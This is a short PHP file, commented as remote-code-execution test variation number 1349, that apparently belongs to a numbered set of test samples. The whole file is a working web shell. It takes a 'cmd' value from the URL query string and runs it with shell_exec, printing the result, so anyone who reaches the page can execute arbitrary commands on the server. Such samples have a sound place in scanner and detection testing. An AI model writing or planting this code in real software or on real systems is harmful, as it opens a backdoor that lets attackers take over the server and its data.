<?php
// RCE test variation #1349
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>